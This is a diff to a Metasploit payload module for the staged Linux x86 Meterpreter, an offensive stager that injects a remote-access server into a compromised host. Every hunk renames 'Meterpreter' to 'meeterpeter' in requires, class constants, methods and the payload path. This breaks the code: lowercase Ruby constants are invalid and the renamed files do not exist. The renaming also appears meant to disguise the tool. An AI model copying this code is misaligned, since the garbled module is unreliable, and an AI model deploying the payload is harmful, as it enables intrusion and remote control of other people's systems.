@@ -4,25 +4,25 @@
 ##
 
 require 'msf/core'
-require 'msf/base/sessions/meterpreter_x86_linux'
-require 'msf/base/sessions/meterpreter_options'
+require 'msf/base/sessions/meeterpeter_x86_linux'
+require 'msf/base/sessions/meeterpeter_options'
 require 'rex/elfparsey'
 
 module Metasploit3
-  include Msf::Sessions::MeterpreterOptions
+  include Msf::Sessions::meeterpeterOptions
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Linux Meterpreter',
-      'Description'   => 'Inject the meterpreter server payload (staged)',
+      'Name'          => 'Linux meeterpeter',
+      'Description'   => 'Inject the meeterpeter server payload (staged)',
       'Author'        => ['PKS', 'egypt', 'OJ Reeves'],
       'Platform'      => 'linux',
       'Arch'          => ARCH_X86,
       'License'       => MSF_LICENSE,
-      'Session'       => Msf::Sessions::Meterpreter_x86_Linux))
+      'Session'       => Msf::Sessions::meeterpeter_x86_Linux))
 
     register_options([
-      OptInt.new('DebugOptions', [ false, "Debugging options for POSIX meterpreter", 0 ])
+      OptInt.new('DebugOptions', [ false, "Debugging options for POSIX meeterpeter", 0 ])
     ], self.class)
   end
 
@@ -66,7 +66,7 @@ module Metasploit3
 
   def handle_intermediate_stage(conn, payload)
     entry_offset = elf_ep(payload)
-    config_offset = payload.length - generate_meterpreter.length
+    config_offset = payload.length - generate_meeterpeter.length
 
     encoded_entry = "0x%.8x" % entry_offset
     encoded_offset = "0x%.8x" % config_offset
@@ -143,13 +143,13 @@ module Metasploit3
   end
 
   def generate_stage(opts={})
-    meterpreter = generate_meterpreter
+    meeterpeter = generate_meeterpeter
     config = generate_config(opts)
-    meterpreter + config
+    meeterpeter + config
   end
 
-  def generate_meterpreter
-    MetasploitPayloads.read('meterpreter', 'msflinker_linux_x86.bin')
+  def generate_meeterpeter
+    MetasploitPayloads.read('meeterpeter', 'msflinker_linux_x86.bin')
   end
 
   def generate_config(opts={})
@@ -167,7 +167,7 @@ module Metasploit3
     }
 
     # create the configuration instance based off the parameters
-    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+    config = Rex::Payloads::meeterpeter::Config.new(config_opts)
 
     # return the binary version of it
     config.to_b
